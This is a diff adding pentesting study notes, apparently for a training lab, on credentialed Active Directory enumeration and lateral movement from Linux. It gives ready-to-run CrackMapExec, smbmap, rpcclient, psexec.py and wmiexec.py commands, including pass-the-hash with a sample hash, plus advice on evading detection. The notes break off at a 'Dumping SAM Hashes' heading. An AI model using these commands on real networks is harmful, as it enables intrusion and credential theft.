@@ -1426,3 +1426,818 @@ Understanding these defenses is important when maintaining persistence and avoid
 
 >[!IMPORTANT]
 >The general goal when pentesting AD environments should be to operate as stealthily as possible | we need to minimize changes and focus on reconnaissance before acting
+
+### Credentialed Access from a Linux Machine
+
+When we gain access to a low-privileged domain user account, whether through password spraying, phishing, or any other attack vector, it opens the door to deeper enumeration and more targeted attacks. Credentialed access allows us to interact with the domain in ways that are not possible as an anonymous or unauthenticated user. This section will focus on how to leverage these low-privileged credentials to enumerate and understand the Active Directory (AD) environment thoroughly using a variety of tools available on a Linux machine.
+
+#### Overview of Tools and Techniques
+
+With valid credentials, even a low-privileged user can retrieve valuable information from AD, such as user attributes, group memberships, ACLs (Access Control Lists), Group Policy Objects (GPOs), and domain trusts. By mapping out this data, we can uncover misconfigurations, over-permissioned accounts, or identify paths to privilege escalation.
+
+In this section, we will be using the following tools to perform in-depth enumeration:
+
+- **CrackMapExec**: A versatile post-exploitation tool that integrates SMB, WMI, and more, allowing us to enumerate user sessions, group memberships, and GPOs.
+- **SMBMap**: Used to identify accessible file shares and potential sensitive data that may be exposed.
+- **rpcclient**: A command-line tool that interacts with Windows RPC services and can retrieve useful domain information.
+- **Impacket Toolkit**: A collection of Python tools that can interact with various protocols like SMB, LDAP, and RPC for domain enumeration.
+- **Windapsearch**: A Python tool that performs LDAP enumeration, gathering detailed information on users, groups, and computers.
+- **BloodHound**: A powerful tool for AD enumeration, used to analyze and visualize AD relationships, ACLs, and potential attack paths within the domain.
+
+#### Key Data to Enumerate
+
+With these tools, we will gather information in the following areas:
+
+1. **Domain Users and Computer Attributes**:
+   - Identify which users and computers exist within the domain.
+   - Gather detailed attributes such as login times, group memberships, and account status.
+
+2. **Group Memberships**:
+   - Enumerate group memberships to identify where our compromised account fits and whether there are high-privileged groups with misconfigurations.
+
+3. **Group Policy Objects (GPOs)**:
+   - Examine which GPOs are applied to different Organizational Units (OUs) and whether any of these can be abused.
+
+4. **Permissions and ACLs**:
+   - Investigate Access Control Lists (ACLs) to determine which objects our account has access to and where we may have permission to write, modify, or read sensitive data.
+
+5. **Trust Relationships**:
+   - Discover domain trust relationships that could potentially allow lateral movement to other parts of the environment.
+
+By systematically gathering and analyzing this information, we will build a comprehensive picture of the domain environment and identify potential attack paths, privilege escalation opportunities, and lateral movement strategies.
+
+In the next sections, we will delve into each tool and technique, providing step-by-step instructions and example commands for each enumeration task. We will start with **CrackMapExec** and explore its capabilities for credentialed access enumeration.
+
+#### CrackMapExec Enumeration Techniques
+
+`CrackMapExec` (CME) is a versatile tool used for post-exploitation and network reconnaissance in Active Directory environments. It integrates SMB, WMI, and other protocols, allowing attackers to query and enumerate detailed domain information using a low-privileged account. With our valid low-privilege user credentials, we can query various aspects of the domain to gain further insights and understand the environment better. This section will focus on enumerating domain users, groups, logged-on users, searching shares, and utilizing the `spider_plus` module to search for sensitive data.
+
+##### Setup and Credentials
+
+In this example, we will be targeting a Domain Controller using the following credentials:
+
+- **Username**: `forend`
+- **Password**: `Klmcargo2`
+- **Domain Controller IP**: `192.168.1.100`
+
+The basic CrackMapExec command structure for authenticating against a target is as follows:
+
+```bash
+crackmapexec smb <TARGET-IP> -u 'forend' -p 'Klmcargo2'
+```
+
+Here’s how to use CrackMapExec for various enumeration techniques:
+
+##### 1. Enumerating Domain Users
+
+To enumerate domain users, we can use the `--users` flag with CrackMapExec. This will query the target Domain Controller for a list of all domain users and their attributes.
+
+```bash
+crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' --users
+```
+
+**Explanation**: This command will connect to the specified Domain Controller (`192.168.1.100`) using the provided credentials and retrieve the domain user list. This information will include usernames, their description, and account status (e.g., enabled/disabled).
+
+**Output Analysis**: Look for interesting details such as:
+- Accounts with descriptions that might indicate administrative roles.
+- Users with unusual naming patterns (e.g., service accounts).
+
+As just mentioined - descriptions can provide clues about a users role and access level in the domain. This makes them valuable for identifying high-privilege accounts. Here are some common descriptions and keywords that might indicate administrative or privileged roles:
+
+![ad56](/images/56.png)
+
+###### 1. **Keywords Indicating Administrator Roles**
+   - `Domain Administrator`
+   - `Enterprise Admin`
+   - `System Administrator`
+   - `IT Admin`
+   - `Backup Operator`
+   - `Server Admin`
+   - `Help Desk Admin`
+   - `Exchange Admin`
+   - `SharePoint Admin`
+   - `SQL Admin`
+   - `GPO Administrator`
+   - `DNS Admin`
+   - `Privileged Account`
+   - `Security Admin`
+
+###### 2. **Phrases Suggesting Elevated Privileges**
+   - `Has elevated privileges`
+   - `Full access to all systems`
+   - `Responsible for domain maintenance`
+   - `Manages all server operations`
+   - `Access to sensitive data`
+   - `Restricted Admin Access`
+   - `Critical system management`
+   - `All system rights`
+   - `Authorized to make changes`
+   - `Access to high-level permissions`
+
+###### 3. **Descriptions with Special Tasks or Responsibilities**
+   - `Performs system backups and restores`
+   - `Manages user permissions`
+   - `Handles network security`
+   - `Handles sensitive user data`
+   - `Manages GPO configurations`
+   - `Maintains core infrastructure`
+
+###### 4. **Short Forms and Common Admin Abbreviations**
+   - `DA` (Domain Admin)
+   - `EA` (Enterprise Admin)
+   - `SA` (System Admin)
+   - `SCCM` (System Center Configuration Manager Admin)
+   - `EXCH` (Exchange Admin)
+
+###### 5. **Accounts with Service or Function Descriptions**
+   - `svc-<service-name>` (e.g., `svc-backup`, `svc-sql`) 
+   - `Service account for server management`
+   - `Service account for automated tasks`
+   - `Used for patch deployment`
+   - `SQL Service Account`
+   - `Backup Service Account`
+
+###### 6. **Descriptions Suggesting Third-Party Administrative Roles**
+   - `Contractor with elevated privileges`
+   - `Vendor access for support`
+   - `Third-party admin for system updates`
+   - `Consultant with system rights`
+
+###### 7. **Miscellaneous Descriptions**
+   - `Admin`
+   - `Root`
+   - `Superuser`
+   - `All Access`
+   - `Privileged`
+   - `Unrestricted`
+
+By identifying these types of descriptions, we can prioritize which accounts to investigate further, as they might be highly valuable for escalation or pivoting within the domain.
+
+##### 2. Enumerating Domain Groups
+
+To enumerate domain groups, we can use the `--groups` flag. This will list all domain groups within the target domain.
+
+```bash
+crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' --groups
+```
+
+**Explanation**: This command retrieves a list of domain groups and can help identify high-value groups such as `Domain Admins`, `Enterprise Admins`, and other potentially sensitive groups.
+
+**Output Analysis**: Identifying group memberships is important for understanding the privileges assigned to different users.
+
+>[!TIP]
+>Pay attention to groups with few members as these often represent high-value targets
+
+High-value target groups are those that have elevated permissions, administrative control, or access to sensitive data within a domain environment. Compromising one of these groups can often lead to domain dominance, sensitive data exposure, or the ability to move laterally and escalate privileges quickly.
+
+![ad57](/images/57.png)
+
+###### **Key High-Value Target Groups in Active Directory**
+
+1. **Domain Admins (`Domain Admins`)**
+   - Full control over the entire domain.
+   - Members can modify all user, group, and computer objects within the domain.
+
+2. **Enterprise Admins (`Enterprise Admins`)**
+   - Highest privilege group in a multi-domain forest.
+   - Can manage all domains within the forest, including adding/removing domains and setting trust relationships.
+
+3. **Administrators (`Administrators`)**
+   - Local administrators on the Domain Controllers.
+   - Can administer all computers and servers if added to local groups.
+
+4. **Schema Admins (`Schema Admins`)**
+   - Can modify the Active Directory schema, making permanent changes to the structure and design of the domain.
+   - A rare but extremely powerful group.
+
+5. **Server Operators (`Server Operators`)**
+   - Can log in locally and shut down Domain Controllers.
+   - Can manage shared folders and disks, and perform backups and restores.
+
+6. **Backup Operators (`Backup Operators`)**
+   - Can back up and restore files, even if they don’t have access permissions to them.
+   - Potential for exfiltrating sensitive data.
+
+7. **Account Operators (`Account Operators`)**
+   - Can create, delete, and modify most user accounts and group memberships.
+   - Cannot directly modify privileged groups (e.g., Domain Admins), but can manipulate other accounts.
+
+8. **Print Operators (`Print Operators`)**
+   - Historically have had elevated permissions.
+   - Potential for privilege escalation attacks such as leveraging DLL hijacking.
+
+9. **Remote Desktop Users (`Remote Desktop Users`)**
+   - Can access servers and workstations remotely.
+   - Useful for lateral movement once credentials are obtained.
+
+10. **Local Administrators (`Local Administrators`)**
+    - Members of the Administrators group on workstations and servers.
+    - If compromised on one machine, can be leveraged for *Pass-the-Hash* and other lateral movement techniques.
+
+11. **Group Policy Creator Owners (`Group Policy Creator Owners`)**
+    - Can create and modify Group Policy Objects (GPOs).
+    - Can be used to push malicious configurations, scripts, and software to large parts of the network.
+
+12. **Exchange Organization Administrators (`Organization Management` in Exchange)**
+    - Full administrative access to the Microsoft Exchange environment.
+    - Can read or manipulate any mailbox, making it highly valuable for email exfiltration and business email compromise.
+
+13. **Custom High-Privilege Groups**
+    - Many organizations create their own custom groups for managing resources or implementing Role-Based Access Control (RBAC).
+    - Groups like `SQL Admins`, `SCCM Admins`, or `App Admins` can provide high-level access to critical infrastructure.
+
+###### **Considerations for Prioritizing High-Value Groups**
+1. **Administrative Control**: Does the group have control over domain-wide settings, permissions, or accounts?
+2. **Access to Sensitive Data**: Does membership in this group grant access to financial, personnel, or other highly sensitive data?
+3. **Ability to Manage Infrastructure**: Can members modify network configurations, servers, or service accounts?
+4. **Visibility**: Are members of these groups closely monitored, or can changes go unnoticed?
+
+By identifying and focusing on these groups, we can prioritize our efforts during enumeration and develop an effective strategy for escalation and lateral movement.
+
+In order to list the users in the groups we just specify the target group name after the `--groups` flag:
+
+```bash=
+crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' --groups 'Domain Admins'
+```
+
+![ad58](/images/58.png)
+
+##### 3. Enumerating Logged-On Users
+
+To view logged-on users across systems, we use the `--loggedon-users` flag. This allows us to see who is currently logged onto the target systems.
+
+```bash
+crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' -M loggedon
+```
+
+**Explanation**: This module queries for active sessions and shows which users are currently logged in. If run against multiple hosts, it can help identify where specific users are active.
+
+**Output Analysis**: If we identify high-privileged users (e.g., domain admins) who are currently logged in, these systems become valuable targets for privilege escalation.
+
+Systems with high-privilege users currently logged on are excellent targets for privilege escalation because they often provide an opportunity to capture or leverage the privileged users credentials, sessions, or tokens, allowing us to escalate privileges quickly without needing to exploit other vulnerabilities. Here is some more detail on why these systems are valuable:
+
+![ad59](/images/59.png)
+
+If we look carefully at the ouput we will see `(Pwn3d!)` for the host at *172.16.5.30* which shows us that the *forend* user is a *local admin* on that machine.
+
+![ad60](/images/60.png)
+
+###### **Why Systems with High-Privilege Users Logged On Are Prime Targets:**
+
+1. **Access to High-Privilege Tokens and Credentials:**
+   - When high-privileged users (e.g., Domain Admins, Enterprise Admins) are logged into a system, they leave behind tokens, session data, or credentials in memory.
+   - We can use tools like Mimikatz to dump credentials, password hashes, or Kerberos tickets from the memory of these systems, allowing for techniques like Pass-the-Hash or Pass-the-Ticket.
+
+2. **Session Hijacking:**
+   - If a high-privileged user is currently logged in, we can sometimes hijack the session without needing the actual credentials.
+   - Techniques like `Token Impersonation` and `Over-Pass-the-Hash` can allow us to directly assume the privileges of the logged-in user.
+
+3. **Kerberos Ticket Extraction:**
+   - When a privileged user is logged on, their Kerberos tickets can be extracted from the system and reused elsewhere in the domain.
+   - We can use techniques like `Pass-the-Ticket` to impersonate the user on other machines or services.
+
+4. **Lateral Movement:**
+   - Gaining access to a system where a privileged user is logged in often allows us to perform lateral movement across the domain using that users privileges.
+   - For example, if a Domain Admin is logged into a workstation, compromising that workstation can give us free reign to access any system the Domain Admin can access.
+
+5. **Lack of Security Controls on Endpoints:**
+   - High-privilege accounts are often used for convenience on regular workstations or servers, which might not have the same level of security controls as Domain Controllers (e.g., less logging, lack of credential guard).
+   - These endpoints may be easier to attack with lower defenses, but still provide high-value credentials.
+
+6. **Service Accounts with Admin Privileges:**
+   - If a service account or script is running with elevated privileges on a system, compromising it can lead to privilege escalation.
+   - For example, we might find plaintext credentials in configuration files or memory for services running under a high-privilege account.
+
+7. **Active Directory Administrative Users:**
+   - Systems with users who are members of groups like Domain Admins, Server Operators, or Backup Operators provide us with the opportunity to escalate privileges and perform actions that could control or alter the entire domain.
+
+###### **Techniques to Leverage High-Priv User Sessions:**
+1. **`mimikatz` for Credential Dumping:**
+   - Run `mimikatz.exe` on the target system and use the command `sekurlsa::logonpasswords` to extract credentials from memory.
+
+2. **`incognito` or `Rubeus` for Token Manipulation:**
+   - Use `incognito.exe` to enumerate and impersonate tokens of high-priv users currently active on the system.
+   - With `Rubeus`, we can extract Kerberos tickets and replay them elsewhere.
+
+3. **`SharpUp` for Privilege Escalation Checks:**
+   - Use `SharpUp` to identify sessions with high-priv users or tokens that can be abused.
+
+4. **`quser` or `tasklist` for Identifying Logged On Users:**
+   - Use `quser` or `tasklist /v` to list the currently logged on users and identify any high-value targets.
+
+###### **Key Consideration:**
+Compromising systems with high-privilege users logged on can often yield the same result as directly compromising the users account. It is a powerful technique that shortcuts the need for multiple escalation steps, making it a top priority during a privilege escalation phase.
+
+##### 4. Searching for Accessible Shares
+
+To find accessible shares on the target, we use the `--shares` option. This command will enumerate all SMB shares on the domain controller and indicate access permissions.
+
+```bash
+crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' --shares
+```
+
+**Explanation**: This command lists all the shares available on the specified host along with their access permissions (e.g., Read, Write).
+
+**Output Analysis**: Look for writable shares, as these could be used for data exfiltration, storing malicious payloads, or escalating privileges. Pay close attention to shares like `SYSVOL` or `NETLOGON`, which can be used in various attacks.
+
+![ad61](/images/61.png)
+
+The SYSVOL and NETLOGON shares are critical components of a Windows Active Directory (AD) environment. They store logon scripts, Group Policy Objects (GPOs), and other important configurations, making them valuable targets. Compromising these shares can allow us to execute code in the context of multiple machines, modify security settings, or collect credentials.
+
+###### **SYSVOL**
+The SYSVOL share is a directory structure on each Domain Controller that stores the server copy of the domains public files. It primarily stores Group Policy Objects (GPOs), which define security settings and other configurations for AD clients. An attacker with write access can modify GPOs to run arbitrary scripts, disable security controls, or create new local admins.
+
+###### **NETLOGON**
+The NETLOGON share is used to store logon scripts executed when users log in to the domain. Attackers with write permissions can drop a malicious DLL and wait for the DLL to be executed as part of logon processes.
+
+##### 5. Using `spider_plus` to Search for Sensitive Data
+
+`spider_plus` is a powerful module that recursively searches for sensitive data within SMB shares. We can use it to hunt for files containing passwords, configuration files, or other valuable information.
+
+```bash
+crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' -M spider_plus --share 'Department Shares'
+```
+
+**Explanation**: This command uses the `spider_plus` module to search the `Department Shares` share for sensitive data. We can specify the target share using the `--share` option. It will search through directories and files, looking for key terms like “password,” “secret,” and “config.”
+
+**Output Analysis**: Review the findings to see if any files contain sensitive information such as plaintext passwords, config files, or any other data that might aid in privilege escalation. The output is stored in`/tmp/cme_spider_plus/<ip-of-host>
+
+![ad62](/images/62.png)
+
+##### Responsible Use and Precautions
+
+When using *CrackMapExec* for enumeration, it is important to keep the following considerations in mind:
+
+1. **Limit Overuse of Modules**: Repeated queries against a Domain Controller can trigger alerts in security monitoring systems. Use the `-d` flag to introduce a slight delay between requests if needed.
+   
+   ```bash
+   crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' --shares -d 5
+   ```
+
+2. **Record Findings**: Store outputs in a structured manner so that we can easily refer back to the data.
+
+   ```bash
+   crackmapexec smb 192.168.1.100 -u 'forend' -p 'Klmcargo2' --users > output_users.txt
+   ```
+
+CrackMapExec is a powerful tool for credentialed access and domain enumeration. By leveraging the different modules available, we can map out the environment, identify potential attack paths, and gather valuable information for subsequent stages of our attack. In the next section, we will explore using `SMBMap` to investigate accessible shares and search for sensitive data.
+
+#### Enumerating SMB Shares Using `smbmap`
+`Smbmap` is a versatile tool for enumerating and interacting with SMB shares. It allows us to easily navigate shared directories, view file contents, and download files of interest. In this section, we will focus on using `smbmap` to perform credentialed enumeration on SMB shares for a Domain Controller (DC) using our looted credentials. We will cover how to list shares, perform a recursive listing of all files, and use additional flags such as `--dir-only` for more targeted enumeration.
+
+The credentials for our enumeration:
+- **Username**: `forend`
+- **Password**: `Klmcargo2`
+- **Target IP (Domain Controller)**: `192.168.1.100`
+
+##### Basic Credentialed Enumeration of SMB Shares
+To start with, we can list the SMB shares accessible to the user `forend` on the Domain Controller. This helps identify which shares are accessible and if there are any default shares, like `SYSVOL` or `NETLOGON`, that might contain valuable information.
+
+```bash
+smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100
+```
+
+**Explanation:**
+- `-u`: Username.
+- `-p`: Password (enclosed in single quotes if it contains special characters).
+- `-d`: Domain (specifies the domain name).
+- `-H`: Host IP address of the target.
+
+This command will display all accessible SMB shares for the user `forend`. Look for interesting shares like `SYSVOL`, `NETLOGON`, or other custom shares that might store scripts, configuration files, or backups.
+
+>[!NOTE]
+>It is the default that a standard user account will not have any access to the ADMIN$ and the C$ shares on a domain controller | having *read* access to IPC$, NETLOGON and SYSVOL is standard | non-default shares we have access to are usually of interest 
+
+![ad63](/images/63.png)
+
+##### Recursive Listing of All Files in a Share
+To see the contents of a specific share recursively, use the `-R` option. This will enumerate all files and folders within the share.
+
+For example, to list all files and folders in the `SYSVOL` share:
+
+```bash
+smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100 -R 'SYSVOL'
+```
+
+**Explanation:**
+- `-R`: Perform a recursive directory listing.
+
+This command helps identify deeply nested files that might otherwise be missed and is useful for discovering configurations, scripts, or sensitive documents stored in subdirectories.
+
+![ad65](/images/65.png)
+
+>[!NOTE]
+>We can search just in the specified directory by using the `-r` flag
+
+![ad67](/images/67.png)
+
+##### Downloading Files
+If we identify a file of interest, such as a backup or script, we can download it using the `--download` (to specify a particular path) option.
+
+For example, to download a specific file like `GroupPolicy.xml`:
+
+```bash
+smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100 --download "SYSVOL\\GroupPolicy.xml"
+```
+
+**Explanation:**
+- `--download "SYSVOL\\GroupPolicy.xml"`: Specifies the path to the file to download.
+
+![ad66](/images/66.png)
+
+### Using the `--dir-only` Flag
+Sometimes, we only want to see the directory structure without cluttering the output with individual files. In these cases, the `--dir-only` flag is useful.
+
+For example, to see only the directories in the `NETLOGON` share:
+
+```bash
+smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100 -R 'NETLOGON' --dir-only
+```
+
+**Explanation:**
+- `--dir-only`: Lists only directories, not individual files.
+
+This flag is particularly useful for quick structural analysis of a share, allowing us to focus on navigating through key directories before diving into file enumeration.
+
+![ad64](/images/64.png)
+
+##### Example Enumeration Workflow
+1. **List all shares available to the user:**
+   ```bash
+   smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100
+   ```
+   
+2. **Perform a recursive listing on a share:**
+   ```bash
+   smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100 -R 'SYSVOL'
+   ```
+
+3. **Download an interesting file like `GroupPolicy.xml`:**
+   ```bash
+   smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100 --download 'SYSVOL\\GroupPolicy.xml'
+   ```
+   
+4. **See only the directory structure of the `NETLOGON` share:**
+   ```bash
+   smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 192.168.1.100 -R 'SYSVOL' --dir-only
+   ```
+
+##### Takeaways
+`smbmap` provides a straightforward way to interact with SMB shares and gather valuable information using valid credentials. While basic listing and downloading are useful, combining recursive listing and pattern matching can lead to quick and efficient data collection. Proper use of flags like `--dir-only` can further refine enumeration to ensure we don't miss critical directories.
+
+In the next section, we will look at using `rpcclient` to further enumerate and interact with the Domain Controller.
+
+#### Using `rpcclient` with Low-Level User Credentials to Enumerate the Domain
+
+In this section, we will explore how to use `rpcclient` with low-privileged user credentials to perform domain enumeration. `rpcclient` allows for extensive interaction with a domain controller (DC) through various functions, providing details about users, groups, shares, and policies. With low-level credentials, it’s possible to gather significant information about a domain that can be useful for further attacks.
+
+##### Understanding SIDs and RIDs
+
+A **Security Identifier (SID)** is a unique identifier assigned to users, groups, and other objects in a Windows domain. Every domain has its own SID, which is a base component shared by all objects within that domain.
+
+Each object within the domain (e.g., users, groups) is assigned a **Relative Identifier (RID)**, which is appended to the domain's SID to uniquely identify the object. The combination of the domain's SID and an object’s RID creates a **unique SID** for each object.
+
+- **SID Format**: `S-1-5-21-<Domain Identifier>-<RID>`
+  - `S-1-5-21`: This is the identifier authority and sub-authorities for all domain-based SIDs.
+  - `<Domain Identifier>`: Unique for each domain.
+  - `<RID>`: A unique identifier for each object within the domain.
+
+For example, if a domain’s SID is `S-1-5-21-123456789-987654321-1234567890`, a user's complete SID might look like `S-1-5-21-123456789-987654321-1234567890-500`, where `500` is the RID for the built-in Administrator account.
+
+>[!NOTE]
+>The *rid* is usually shown in *hexadecimal* so decimal `500` which is the built-in Administrator account would have an *rid* of `0x1F4`
+
+Another example would be for a domain user. The *domain sid* is `S-1-5-21-3842939050-3880317879-2865463114` and the *rid* of *htb-student* is `[0x457]` which equates to `1111` in *decimal* so the *unique sid* for the *htb-student* user is `S-1-5-21-3842939050-3880317879-2865463114-1111`
+
+##### Converting the RID to Decimal
+
+RIDs are often represented in **hexadecimal** format, but they can be converted to decimal to interpret the value more easily. For example, the hexadecimal value `0x1F4` converts to the decimal value `500`, which is the RID for the Administrator account.
+
+To convert hex to decimal in Linux:
+```bash
+echo $((16#<hex_value>))
+```
+For example, for `0x1F4`:
+```bash
+echo $((16#1F4))
+```
+This will output `500` in decimal.
+
+##### Enumerating the Domain Using `rpcclient`
+
+When using `rpcclient` with low-privileged credentials, you can still enumerate many aspects of the domain. Below are some of the most common functions used in this context.
+
+---
+
+1. **Enumerating Domain Users: `enumdomusers`**
+
+This function lists all users within the domain by their **RIDs** and names.
+
+- **Command**:
+  ```bash
+  rpcclient <IP> -U <username> -c "enumdomusers"
+  ```
+  - `<IP>`: The IP address of the domain controller.
+  - `<username>`: The low-privileged user’s credentials.
+
+- **Output**:
+  ```
+  user:[jsmith] rid:[0x44e]
+  user:[jdouglas] rid:[0x44f]
+  ```
+
+This command will return a list of users along with their RIDs. The RID is shown in hexadecimal format.
+
+![ad68](/images/68.png)
+
+###### Practical Use of RIDs
+
+Once we have a list of user RIDs, we can query more information about each user by using the **`queryuser`** function.
+
+2. **Querying User Details: `queryuser`**
+
+The `queryuser` function provides detailed information about a specific user, such as their home directory, last logon time, password age, and more.
+
+- **Command**:
+  ```bash
+  rpcclient <IP> -U <username> -c "queryuser <RID>"
+  ```
+  - `<RID>`: The Relative Identifier of the user in question (can be obtained from `enumdomusers`).
+
+- **Example**:
+  ```bash
+  rpcclient <IP> -U <username> -c "queryuser 0x44e"
+  ```
+
+- **Output**:
+  ```
+  User Name   : jsmith
+  Full Name   : John Smith
+  Logon Time  : Wed, 01 Sep 2021 10:42:33
+  Home Dir    : \\dc1\users\jsmith
+  Password Age: 10 days
+  ```
+
+This information can be valuable for understanding user activity and potential targets for attacks.
+
+![ad69](/images/69.png)
+
+---
+
+3. **Enumerating Domain Groups: `enumdomgroups`**
+
+This function lists all groups within the domain, showing their RIDs and names.
+
+- **Command**:
+  ```bash
+  rpcclient <IP> -U <username> -c "enumdomgroups"
+  ```
+
+- **Output**:
+  ```
+  group:[Domain Admins] rid:[0x200]
+  group:[Domain Users] rid:[0x201]
+  ```
+
+As with users, the RIDs of the groups are presented in hexadecimal.
+
+![ad70](/images/70.png)
+
+#### Using `psexec.py` and `wmiexec.py` from Impacket
+
+##### Overview of Impacket
+**Impacket** is a collection of Python classes and scripts for working with network protocols. It allows Python developers to craft and parse network packets, which can be useful for tasks like network exploration, penetration testing, or administration. Impacket includes several tools that facilitate domain enumeration, lateral movement, and exploitation in a Windows environment.
+
+Two popular tools provided by Impacket for gaining access to a Windows machine remotely are `psexec.py` and `wmiexec.py`. Both tools can be used to execute commands or spawn shells on remote Windows hosts, particularly when you have local administrator credentials.
+
+---
+
+##### `psexec.py`
+**`psexec.py`** mimics the behavior of the traditional `psexec` tool from Sysinternals. It leverages the **SMB protocol** to execute commands on a remote Windows machine. When using this tool, a service is installed on the target host to execute commands and then removed once the session is complete.
+
+###### How `psexec.py` Works:
+- **Service-based execution**: The tool installs a temporary service on the remote host to execute commands - a randomly named executable is uploaded to the `ADMIN$` share
+- **Interactive shell**: By default, `psexec.py` provides an interactive shell where you can execute commands on the remote machine.
+- **Credential requirements**: It requires valid credentials (username, password, or NTLM hash) with administrative privileges on the target machine.
+
+###### Example Command (using local administrator credentials):
+```bash
+psexec.py <domain>/<username>:<password>@<target-ip>
+```
+- `<domain>`: The domain or workgroup name of the target system (can be omitted if not applicable).
+- `<username>`: The username of an account with local administrator privileges.
+- `<password>`: The password for the account (or NTLM hash can be used).
+- `<target-ip>`: The IP address of the target machine.
+
+Once the command is run, you will have an interactive shell on the remote host.
+
+##### Example Output:
+```bash
+psexec.py MYDOMAIN/forend:Klmcargo2@192.168.1.10
+[*] Requesting shares on 192.168.1.10.....
+[*] Found writable share ADMIN$
+[*] Uploading file FMwJcGiH.exe
+[*] Opening SVCManager on 192.168.1.10.....
+[*] Creating service RMEZ on 192.168.1.10.....
+[*] Starting service RMEZ.....
+[!] Press help for extra shell commands
+C:\Windows\system32>
+```
+Here, `psexec.py` installs a service, starts it, and then spawns an interactive command shell.
+
+![ad71](/images/71.png)
+
+---
+
+##### `wmiexec.py`
+**`wmiexec.py`** uses **Windows Management Instrumentation (WMI)** to execute commands on a remote Windows machine. Unlike `psexec.py`, `wmiexec.py` does not create a service on the target machine, making it a bit more stealthy.
+
+###### How `wmiexec.py` Works:
+- **WMI-based execution**: It leverages WMI to run commands remotely.
+- **Command execution**: Commands are executed under the context of the provided credentials, and the tool returns the output of each command as a separate interaction.
+- **Less intrusive**: Unlike `psexec.py`, this tool does not create or remove services on the remote system, which can help evade certain detection mechanisms.
+
+###### Example Command:
+```bash
+wmiexec.py <domain>/<username>:<password>@<target-ip>
+```
+
+Just like with `psexec.py`, replace `<domain>`, `<username>`, `<password>`, and `<target-ip>` with appropriate values. Once connected, you can run commands as shown in the example below.
+
+###### Example Output:
+```bash
+wmiexec.py MYDOMAIN/forend:Klmcargo2@192.168.1.10
+[*] SMBv2.1 dialect used
+[!] Press help for extra shell commands
+C:\Windows\system32> whoami
+nt authority\system
+```
+Here, the `whoami` command is executed on the remote system, and the tool returns the result.
+
+![ad72](/images/72.png)
+
+---
+
+##### Key Differences Between `psexec.py` and `wmiexec.py`
+- **Intrusiveness**: `psexec.py` installs a service on the target system (which may trigger alerts), while `wmiexec.py` does not.
+- **Command Interaction**: `psexec.py` provides a continuous interactive shell, whereas `wmiexec.py` executes individual commands, returning output line by line.
+- **Stealth**: `wmiexec.py` is generally considered more stealthy because it doesn’t rely on installing services on the target.
+
+>[!NOTE]
+>Even though `wmiexec.py` is considered more stealthy it does generate the *event ID* of `4688: A new process has been created` in event logs and might be noticed by defenders
+
+---
+
+##### Summary of Commands
+
+1. **`psexec.py`**:
+   - Best for: Getting a persistent interactive shell.
+   - Command: 
+     ```bash
+     psexec.py <domain>/<username>:<password>@<target-ip>
+     ```
+   - Example: 
+     ```bash
+     psexec.py forend:Klmcargo2@192.168.1.10
+     ```
+
+2. **`wmiexec.py`**:
+   - Best for: Executing commands without leaving as many traces.
+   - Command: 
+     ```bash
+     wmiexec.py <domain>/<username>:<password>@<target-ip>
+     ```
+   - Example: 
+     ```bash
+     wmiexec.py forend:Klmcargo2@192.168.1.10
+     ```
+     
+---
+
+##### Using `psexec.py` with a Captured Hash
+
+`psexec.py` allows you to perform a pass-the-hash attack by providing the captured NTLM hash instead of a password.
+
+>[!NOTE]
+>We can capture hashes via an llmnr poisoning attack with `responder` | we covered this earlier in these notes | the user the hash is for has to be a *local admin* on the target machine for this to work
+
+###### Example Command:
+```bash
+psexec.py <domain>/<username>@<target-ip> -hashes <LMHASH>:<NTLMHASH>
+```
+- `<domain>`: The domain name or workgroup of the target system (optional if not part of a domain).
+- `<username>`: The username of the account whose hash you've captured.
+- `<target-ip>`: The IP address of the target Windows machine.
+- `<LMHASH>`: The LAN Manager (LM) hash, which can be left as `aad3b435b51404eeaad3b435b51404ee` (the default if not present).
+- `<NTLMHASH>`: The NTLM hash you captured using Responder or other tools.
+
+###### Example:
+```bash
+psexec.py inlanefreight.local/forend@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:4d3a8f7ac6b98bfa8a23d7a1abec5d99
+```
+
+In this example, we pass the NTLM hash for the `forend` user. If the user has administrative privileges, this will give you an interactive shell.
+
+![ad72b](/images/72b.png)
+
+---
+
+##### Using `wmiexec.py` with a Captured Hash
+
+Similar to `psexec.py`, `wmiexec.py` can also perform pass-the-hash attacks using the NTLM hash.
+
+###### Example Command:
+```bash
+wmiexec.py <domain>/<username>@<target-ip> -hashes <LMHASH>:<NTLMHASH>
+```
+
+###### Example:
+```bash
+wmiexec.py inlanefreight.local/forend@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:4d3a8f7ac6b98bfa8a23d7a1abec5d99
+```
+
+This will execute commands on the target without installing a service. Like `psexec.py`, `wmiexec.py` will pass the NTLM hash for authentication.
+
+---
+
+##### What’s Happening?
+
+- **Pass-the-Hash Attack**: Both `psexec.py` and `wmiexec.py` use the NTLM hash in place of a password. Windows uses the NTLM authentication mechanism to validate users, and with the correct hash, you can authenticate without knowing the user’s actual password.
+  
+- **LM Hash**: In modern systems, the LM hash can often be ignored (`aad3b435b51404eeaad3b435b51404ee`), since it is disabled on newer Windows versions. The important part is the **NTLM hash**.
+
+- **Interactive Shell**: If the credentials you have (or the hash) belong to a user with administrative rights on the target system, both tools will grant you an interactive shell or allow you to run commands remotely.
+
+---
+
+##### Dumping SAM Hashes
